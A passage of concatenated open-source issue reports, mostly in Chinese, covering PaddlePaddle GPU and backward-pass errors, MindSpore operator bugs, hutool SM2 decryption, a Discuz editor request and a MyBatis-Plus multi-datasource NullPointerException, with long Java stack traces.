io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) [undertow-servlet-2.2.18.Final.jar:2.2.18.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) [undertow-core-2.2.18.Final.jar:2.2.18.Final] at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1282) [xnio-api-3.8.7.Final.jar:3.8.7.Final] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_51]
pip 安装的PaddlePaddle GPU版本启动训练报错,"安装方式 验证安装 运行 https://github.com/paddlepaddle/book 的第一课 CPU版本可以完成训练，修改为后报如下错误：   <code>: pip install paddlepaddle-gpu PaddlePaddle 0.10.1, compiled with with_avx: ON with_gpu: ON with_double: OFF with_python: ON with_rdma: OFF with_timer: OFF book/01.fit_a_line &gt;python train.py use_gpu=True I0822 16:07:13.031286 27082 Util.cpp:166] commandline: --use_gpu=True --trainer_count=1 F0822 16:07:13.250742 27082 DynamicLoader.cpp:104] Check failed: nullptr != *dso_handle Failed to find dynamic library: libcudnn.so (libcudnn.so: cannot open shared object file: No such file or directory) Please specify its path correctly using following ways: Method. set environment variable LD_LIBRARY_PATH on Linux or DYLD_LIBRARY_PATH on Mac OS. For instance, issue command: export LD_LIBRARY_PATH=... Note: After Mac OS 10.11, using the DYLD_LIBRARY_PATH is impossible unless System Integrity Protection (SIP) is disabled. *** Check failure stack trace: *** @ 0x7efca96a58dd google::LogMessage::Fail() @ 0x7efca96a7c28 google::LogMessage::SendToLog() @ 0x7efca96a53cb google::LogMessage::Flush() @ 0x7efca96a8afe google::LogMessageFatal::~LogMessageFatal() @ 0x7efca95dd1d6 GetDsoHandleFromSearchPath() @ 0x7efca95dd4a2 GetCudnnDsoHandle() @ 0x7efcd3c3ca99 __pthread_once_slow @ 0x7efca96484f6 hl_cudnn_init() @ 0x7efca965364f hl_create_global_resources() @ 0x7efca9653fb4 hl_specify_devices_start() @ 0x7efca965428d hl_start() @ 0x7efca95da9be paddle::initMain() @ 0x7efca968be41 initPaddle() @ 0x7efca91b1e17 _wrap_initPaddle @ 0x4c468a PyEval_EvalFrameEx @ 0x4c9d8f PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4de6fe (unknown) @ 0x4b0cb3 PyObject_Call @ 0x4c6ad1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4c2509 PyEval_EvalCode @ 0x4f1def (unknown) @ 0x4ec652 PyRun_FileExFlags @ 0x4eae31 PyRun_SimpleFileExFlags @ 0x49e14a Py_Main @ 0x7efcd3884830 __libc_start_main @ 0x49d9d9 _start [1] 27082 abort (core dumped) python train.py"
unify REGISTER_OP and REGISTER_OPERATOR,"background currently, we have two macro REGISTER_OP and REGISTER_OPERATOR to register an operator to our framework, it's confusing, we should unify these two interfaces. history firstly, we have REGISTER_OP, the interface is There are several reasons why this interface cannot meet our requirement now. This interface directly registers a grad_op_class for one op_type, it cannot support to use multiple ops to construct the backward ops for one forward op. So we have grad_op_desc_maker and need to register this instead of one grad_op_class) We split Infershape from op_with_kernel and add InferShapeBase, it also needs to be registered to the framework. is used to do this: the new REGISTER_OPERATOR support to register GradOpDescMakerBase and InferShapeBase. the REGISTER_OP now is just a proxy interface that will call REGISTER_OPERATOR at last, it does two things to call REGISTER_OPERATOR register grad_op_type use REGISTER_OPERATOR. generate one DefaultGradOpDescMaker for this op_type. things need to do to unify the interface implement all InferShape in op_with_kernel with InferShapeBase. change to a interface. implement a macro to easily define a default GradOpDescMaker for the ops that use REGISTER_OP to register. remove REGISTER_OP in op_registry.h.   <code>: #define REGISTER_OP(op_type, op_class, op_maker_class, grad_op_type, grad_op_class) REGISTER_OPERATOR /* The variadic arguments should be class types derived from one of the following classes: OpProtoAndCheckerMaker GradOpDescMakerBase VarTypeInference InferShapeBase */ #define REGISTER_OPERATOR(op_type, op_class, ...) virtual void InferShape(InferShapeContext* ctx) final"
强烈建议Discuz!X编辑器升级并支持<H>1~6标签，<anchor>标签，以及方便的插入各大网站的视频,Discuz!X的编辑器不能在帖子中输出 标签。从搜索到的结果看，好几年前到现在一直有网友呼吁，但官方没重视。 实际上1~6网页内容结构化的重要标签，对帖子和文章的SEO非常有用。 现在只能用Discuz!X编辑器的 在视觉上代替 标签，这样对于搜索引擎理解文章非常不利。   <code>: &lt;h&gt; 1~6 &lt;h&gt; &lt;strong&gt; &lt;h&gt;
"`hl_matrix_add` is not used in Paddle, and could be deleted. ","We found in this PR #1938:modify the home pages. Also the are not widely used( currently only used in unit test), and should be removed.   <code>: ParameterUpdateFunctions.h/cpp"
SM2 验签后无法解密,"JDK版本： openjdk_8_201 hutool版本： 5.4.3 SM2 加密、签名、验签后无法解密   <code>: public void SM2Sm2Test() { SM2 sm2 = SmUtil.sm2(); String src = ""Sm2Test""; byte[] data = sm2.encrypt(src, KeyType.PublicKey); byte[] sign = sm2.sign(src.getBytes()); sm2 = SmUtil.sm2(sm2.getPrivateKey().getEncoded(),sm2.getPublicKey().getEncoded()); StaticLog.info(""验签结果：{}"", sm2.verify( src.getBytes(), sign)); byte[] dec = sm2.decrypt(data, KeyType.PrivateKey); StaticLog.info(""解密结果：{}"", new String(dec)); StaticLog.info(""解密结果：{}"", Arrays.equals(dec, src.getBytes())); }"
【ST】【MS】【OPS】StandardNormal算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错,"StandardNormal算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_standardnormal_func_shape_2d test_ms_ops_standardnormal_func_shape_1d test_ms_ops_standardnormal_func_shape_3d test_ms_ops_standardnormal_func_shape_4d test_ms_ops_standardnormal_func_shape_5d test_ms_ops_standardnormal_func_shape_6d test_ms_ops_standardnormal_func_shape_7d test_ms_ops_standardnormal_func_seed_seed2_default export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=CPU_X86 / export DEVICE_TYPE=GPU_PCIE pytest -s test_ms_ops_standardnormal_func.py 用例执行通过 ` ../../../../common/ms_aw/operator/random/standardnormal_ops.py:55: in forward_mindspore_impl out = net(self.input_x) ../../../../common/utils/operator_helper.py:319: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:276: in run_dynamic_shape if arg.shape != () and not isinstance(arg, Parameter) else arg for arg in args] .0 = &lt;tuple_iterator object at 0x7f46f3ab0110&gt; E AttributeError: 'tuple' object has no attribute 'shape' ` 算子负责人：梁成辉   <code>: input_dyn = [Tensor(shape=[None for _ in arg.shape], dtype=arg.dtype) if arg.shape != () and not isinstance(arg, Parameter) else arg for arg in args]"
【众智】【计算-GPU开发】MultinomialWithReplacement,"返回一个张量，每行包含从输入张量对应行的多项式概率分布采样。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/random_ops.py x numsamples int 属性 replacement bool 属性 默认False seed int 属性 默认0 y 对应底层算子 对应底层算子Uniform PyTorch1.8.1接口： torch.multinomial https://pytorch.org/docs/1.8.1/generated/torch.multinomial.html   <code>: class MultinomialWithReplacement(Primitive): REG_OP(MultinomialWithReplacement) .INPUT(x, TensorType({ DT_FLOAT16,DT_FLOAT,DT_DOUBLE })) .OUTPUT(y, TensorType({ DT_INT64 })) .REQUIRED_ATTR(numsamples, Int) .ATTR(replacement, Bool, false) .ATTR(seed, Int, 0) .OP_END_FACTORY_REG(MultinomialWithReplacement)"
建议:排序字段名问题,"我的sql字段是这样格式的 sys_user.name as 'creatuser.name' 分页插件生成的代码如下 由于没有creatuser临时表所以报错 [Err] 1054 - Unknown column 'creatuser.name' in 'order clause' 将creatuser.name改成能正常运行 建议将""查询SQL拼接Order By""方法修改成   <code>: ORDER BY creatuser.name DESC creatuser.name buildSql.append("" ORDER BY `"").append(ascStr).append(""`"").append(descStr);"
"[CT][MS][generate]variable num input for subfunc, grad fail","子网调用，反向报错 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :d824f2ae, master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python variable_arg.py pass ms forward: [1.] Traceback (most recent call last): File ""variable_args.py"", line 126, in fgrad = grad_net(Tensor(x), Tensor(y)) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/common/api.py"", line 518, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/common/api.py"", line 94, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/common/api.py"", line 334, in call phase = self.compile(args_list, self.fn.name) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/common/api.py"", line 302, in compile is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) RuntimeError: UpdateAdjoint adjoint definition already exists 204_?test.278 205_?test.279. '---------------------------------------------------- '- The Traceback of Net Construct Code: '---------------------------------------------------- '# In file variable_args.py(28) while (y &gt; x): '---------------------------------------------------- '- C++ Call Stack: (For framework developers) '---------------------------------------------------- mindspore/ccsrc/frontend/optimizer/ad/dfunctor.cc:735 UpdateAdjoint   <code>: from mindspore.nn import Cell, GraphCell from mindspore.common import Tensor, dtype, Parameter import mindspore.ops.operations as P import mindspore.ops.functional as F import numpy as np class SubNet(Cell): def construct(self, x, y): if (x &lt; test(x, x)): x = (1 - x) y = (test(y, y) + y) elif (x &lt;= test(y, y)): return x elif (5 &gt; x): y = (test(y, x) / y) return y def test(x, y): while (y &gt; x): x = (2 - y) return y class Net(Cell): def __init__(self, snet): super().__init__() self.w = Parameter(Tensor([(- 3)], dtype.float32), name='w') self.b = Parameter(Tensor([(- 1)], dtype.float32), name='b') self.subnet = snet def subfunc(self, x): for f in range(2): return self.w return x def construct(self, x, y): if (3 &lt;= self.w): self.b = (self.subnet(self.b, y) - self.w) y = (2 / y) elif (3 &gt;= x): y = (self.b + self.b) elif (1 != self.b): if (y == self.w): return self.w elif (y == y): x = (self.w + 3) elif (y &gt;= self.b): y = (3 / self.b) else: return self.w elif (3 == self.b): if (self.subfunc(y) == y): self.b = (self.subnet(x, x) - x) elif (5 &lt; self.b): self.w = (self.w * self.w) return (x + y) x = np.array([3], np.float32) y = np.array([-1], np.float32) snet = SubNet() net = Net(snet) out = net(Tensor(x), Tensor(y)) print('ms forward: ', out) net1 = Net(snet) grad_net = F.grad(net1, grad_position=(0, 1)) fgrad = grad_net(Tensor(x), Tensor(y)) print('ms backward: ', fgrad)"
swagger文档地址还是有问题,pigx版本: 2.7.0 操作系统: windowns 7 是否修改包名: 否   <code>: swagger文档地址还是有问题，如图所示
有关反向传播过程中出现的错误,"环境：aistudio 硬件信息 当前环境高级版 切换环境 CPU 8 RAM 32GB GPU v100 显存 16GB 磁盘 100GB 环境配置 Python版本 python3.7 框架版本 PaddlePaddle 1.7.1 模型实现如下，自己实现的LRN算子 LRN 的实现 2.复现信息，前向传播和反向传播测试如下： <ol start=""3""> 问题描述 前向传播能够正常进行，但是反向传播计算梯度时报错   <code>: class LocalResponseNorm(fluid.dygraph.Layer): __constants__ = ['size', 'alpha', 'beta', 'k'] def __init__(self, size, alpha=1e-4, beta=0.75, k=1.): super(LocalResponseNorm, self).__init__() self.size = size self.alpha = alpha self.beta = beta self.k = k def forward(self, input): dim = len(input.shape) if dim &lt; 3: raise ValueError('Expected 3D or higher dimensionality \ input (got {} dimensions)'.format(dim)) div = fluid.layers.unsqueeze(input * input, axes=1) if dim == 3: div = fluid.layers.pad(div, (0, 0, 0, 0, self.size // 2, (self.size - 1) // 2, 0, 0, 0, 0)) div = fluid.layers.pool2d(div, pool_size=(self.size, 1), pool_stride=1, pool_type='avg') div_shape = div.shape div_shape.pop(1) div = fluid.layers.reshape(div, shape=div_shape) else: sizes = input.shape div = fluid.layers.reshape(div, (sizes[0], 1, sizes[1], sizes[2], -1)) div = fluid.layers.pad(div, (0, 0, 0, 0, self.size // 2, (self.size - 1) // 2, 0, 0, 0, 0)) div = fluid.layers.pool3d(div, (self.size, 1, 1), pool_stride=1, pool_type='avg') div_shape = div.shape div_shape.pop(1) div = fluid.layers.reshape(div, shape=div_shape) div = fluid.layers.reshape(div, sizes) div = fluid.layers.pow((div * self.alpha + self.k), factor=self.beta) # print('final', div.shape) return input / div class LBNet_highwayThree(fluid.dygraph.Layer): # SHT网络 def __init__(self, nc=2): super(LBNet_highwayThree, self).__init__() self.convolutions1 = fluid.dygraph.Sequential( nn.Conv2D(nc, 16, filter_size=7, stride=1), nn.BatchNorm(16, act='relu'), nn.Conv2D(16, 16, filter_size=1, stride=1), nn.BatchNorm(16, act='relu'), nn.Conv2D(16, 16, filter_size=3, stride=1, padding=1), nn.BatchNorm(16, act='relu'), nn.Conv2D(16, 16, filter_size=1, stride=1) ) self.high_way = fluid.dygraph.Sequential( nn.BatchNorm(2, act='relu'), nn.Conv2D(2, 16, filter_size=7, stride=1), ) self.convolutions2 = fluid.dygraph.Sequential( nn.BatchNorm(16, act='relu'), LocalResponseNorm(5, 0.0001, 0.75, 2), nn.Pool2D(pool_size=2, pool_stride=2), nn.Conv2D(16, 64, filter_size=7, stride=1), nn.BatchNorm(64, act='relu'), LocalResponseNorm(5, 0.0001, 0.75, 2), nn.Pool2D(pool_size=2, pool_stride=2), nn.Conv2D(64, 256, filter_size=7, stride=1) ) self.mlp = fluid.dygraph.Sequential( nn.Linear(21 * 21 * 256, 1) ) def forward(self, x): x1 = self.convolutions1(x) x2 = self.high_way(x) x = x1 + x2 x = self.convolutions2(x) x = fluid.layers.reshape(x, (-1, 21 * 21 * 256)) x = fluid.layers.relu(x) x = fluid.layers.dropout(x, dropout_prob=0.5) x = self.mlp(x) return x if __name__ == '__main__': test_data = np.ones((2, 2, 126, 126)).astype('float32') label = np.array([[0], [1]]).astype('float32') with fluid.dygraph.guard(): lb = LBNet_highwayThree() # lrn = LocalResponseNorm(5, 0.0001, 0.75, 2) x = fluid.dygraph.base.to_variable(test_data) label = fluid.dygraph.base.to_variable(label) output = lb(x) print(output) loss = fluid.layers.sigmoid_cross_entropy_with_logits(output, label) print('loss:', loss) loss.backward() Traceback (most recent call last): File ""work/SHT/model.py"", line 104, in &lt;module&gt; loss.backward() File ""&lt;/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/decorator.py:decorator-gen-60&gt;"", line 2, in backward File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 207, in __impl__ return func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 116, in backward self._run_backward(backward_strategy, framework._dygraph_tracer()) paddle.fluid.core_avx.EnforceNotMet: Error Message Summary: ---------------------- Error: at (/paddle/paddle/fluid/operators/batch_norm_op.cc:445)"
support use deterministic cudnn operators,"currently mindspore can’t exactly reproduce training result in two runs with the same settings. This could be solved by using deterministic cudnn operators, e.g. in PyTorch, this can be done via https://pytorch.org/docs/stable/notes/randomness.html   <code>: torch.backends.cudnn.deterministic = True"
Mac link error: ld: unknown option: --version-script,"Line 16 of the : https://github.com/PaddlePaddle/Paddle/blob/898e0ffa210551149cc411a3be366e8d36aeb67b/paddle/fluid/inference/CMakeLists.txt#L16 However, of MacOS doesn't support , so this line will lead to a link error on Mac:   <code>: paddle/fluid/inference/CMakeLists.txt ld --version-script ld: unknown option: --version-script clang: error: linker command failed with exit code 1 (use -v to see invocation) make[2]: *** [paddle/fluid/inference/libpaddle_fluid.dylib] Error 1 make[1]: *** [paddle/fluid/inference/CMakeFiles/paddle_fluid_shared.dir/all] Error 2 make: *** [all] Error 2"
多数据源中mybatisplus自带的baseMapper接口无法生效,"JDK版本: 1.8 SpringBoot版本: 2.2.0.8.RELEASE Starter版本: 3.1.0 多主数据源配置 dynamic-datasource-spring-boot-starter 2.0.2 我在此类中添加了一个方法，类中只有这个方法能访问到，其他方法都继承 com.baomidou.mybatisplus.core.mapper.BaseMapper的方法。 该如何解决多数据源问题？   <code>: @Service @DS(""back"") public class SmsServiceImpl extends ServiceImpl&lt;SmsMapper, Sms&gt; implements ISmsService { @Override public IPage&lt;SmsVO&gt; selectSmsPage(IPage&lt;SmsVO&gt; page, SmsVO sms) { return page.setRecords(baseMapper.selectSmsPage(page, sms)); } } java.lang.NullPointerException: null at com.baomidou.dynamic.datasource.aop.DynamicDataSourceAnnotationInterceptor.determineDatasource(DynamicDataSourceAnnotationInterceptor.java:60) at com.baomidou.dynamic.datasource.aop.DynamicDataSourceAnnotationInterceptor.invoke(DynamicDataSourceAnnotationInterceptor.java:45) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at org.springblade.desk.service.impl.SmsServiceImpl$$EnhancerBySpringCGLIB$$d024bd1c.getOne(&lt;generated&gt;) at org.springblade.desk.controller.SmsController.detail(SmsController.java:61) at org.springblade.desk.controller.SmsController$$FastClassBySpringCGLIB$$4aa7998b.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:746) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) at org.springblade.core.boot.logger.RequestLogAspect.aroundApi(RequestLogAspect.java:121) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:174) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at org.springblade.desk.controller.SmsController$$EnhancerBySpringCGLIB$$4b0b17d9.detail(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:891) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:981) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:873) at javax.servlet.http.HttpServlet.service(HttpServlet.java:687) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:858) at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at com.github.xiaoymin.swaggerbootstrapui.filter.SecurityBasicAuthFilter.doFilter(SecurityBasicAuthFilter.java:80) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.github.xiaoymin.swaggerbootstrapui.filter.ProductionSecurityFilter.doFilter(ProductionSecurityFilter.java:53) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springblade.core.tool.support.xss.XssFilter.doFilter(XssFilter.java:43) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:117) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:106) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.alibaba.csp.sentinel.adapter.servlet.CommonFilter.doFilter(CommonFilter.java:89) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:65) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) at 